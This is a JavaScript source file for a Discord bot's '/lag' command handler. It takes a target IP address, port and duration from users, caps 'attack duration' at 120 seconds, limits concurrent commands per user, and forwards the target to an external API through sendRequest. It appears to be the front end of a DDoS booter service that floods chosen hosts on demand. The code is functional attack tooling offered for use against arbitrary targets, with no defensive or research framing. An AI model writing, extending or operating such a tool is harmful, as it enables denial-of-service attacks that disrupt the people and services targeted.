const { sanitizeInput, isValidIP, isValidPort, isValidTime } = require('../utils/utils');
const { sendRequest } = require('../utils/api');

const handleLagCommand = async (interaction, userActiveCommands, selectApi, apiDetails, logActiveAttacks, logSystemMessage) => {
    const userId = interaction.user.id;
    const client = interaction.client;

    if (!userActiveCommands[userId]) {
        userActiveCommands[userId] = 0;
    }

    if (userActiveCommands[userId] >= 2) {
        return interaction.reply({ content: 'You have reached the maximum number of concurrent /lag commands. Please wait for your current commands to complete.', ephemeral: true });
    }

    const target = interaction.options.getString('ip');
    const port = interaction.options.getInteger('port');
    let time = interaction.options.getInteger('time');

    if (!isValidIP(target) || !isValidPort(port) || !isValidTime(time)) {
        return interaction.reply({ content: 'Invalid input parameters.', ephemeral: true });
    }

    const sanitizedIp = sanitizeInput(target);
    if (time > 120) time = 120; // Limit the attack duration to 120 seconds

    try {
        userActiveCommands[userId] += 1;
        await logSystemMessage(client, `User ${interaction.user.tag} active commands: ${userActiveCommands[userId]}`);

        await interaction.deferReply({ ephemeral: true }); // Acknowledge interaction
        await logSystemMessage(client, `Command ${interaction.commandName} received, deferring reply`);

        console.log(`Sending API request for ${sanitizedIp}:${port} for ${time} seconds`);
        await sendRequest(client, interaction, sanitizedIp, port, time);

        userActiveCommands[userId] -= 1;
        await logSystemMessage(client, `User ${interaction.user.tag} active commands: ${userActiveCommands[userId]}`);
    } catch (error) {
        console.error('Error handling interaction:', error);
        await logSystemMessage(client, `Error handling interaction: ${error.message}`);
        if (!interaction.replied) {
            await interaction.reply({ content: 'There was an error executing this command.', ephemeral: true });
        } else {
            await interaction.followUp({ content: 'There was an error executing this command.', ephemeral: true });
        }
        userActiveCommands[userId] -= 1;
    }
};

module.exports = { handleLagCommand };
